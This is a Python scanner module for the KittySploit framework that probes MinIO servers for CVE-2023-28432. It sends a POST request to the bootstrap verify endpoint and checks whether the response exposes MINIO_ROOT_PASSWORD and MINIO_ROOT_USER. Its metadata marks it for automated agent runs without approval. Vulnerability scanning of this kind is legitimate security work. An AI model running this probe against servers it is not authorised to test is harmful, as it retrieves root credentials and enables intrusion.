#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MinIO is susceptible to information disclosure."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MinIO Cluster Deployment - Information Disclosure Detection',
        'description': 'MinIO is susceptible to information disclosure. In a cluster deployment starting with RELEASE.2019-12-17T23-16-33Z and prior to RELEASE.2023-03-20T20-16-18Z, MinIO returns all environment variables, including MINIO_SECRET_KEY and MINIO_ROOT_PASSWORD. An attacker can potentially obtain sensitive information, modify data, and/or execute unauthorized operations without entering necessary credentials. All users of distributed deployment are impacted.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'minio', 'console', 'exposure', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q',
            'https://github.com/minio/minio/pull/16853/files',
            'https://github.com/golang/vulndb/issues/1667',
            'https://github.com/CVEProject/cvelist/blob/master/2023/28xxx/CVE-2023-28432.json',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-28432',
        ],
        'cve': 'CVE-2023-28432',
    }

    def run(self):
        path = '/minio/bootstrap/v1/verify'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('"MINIO_ROOT_PASSWORD":', '"MINIO_ROOT_USER":', '"MinioEnv":',)
        header_any = ('text/plain',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='MinIO Cluster Deployment - Information Disclosure detected', path=path)
            return True
        return False

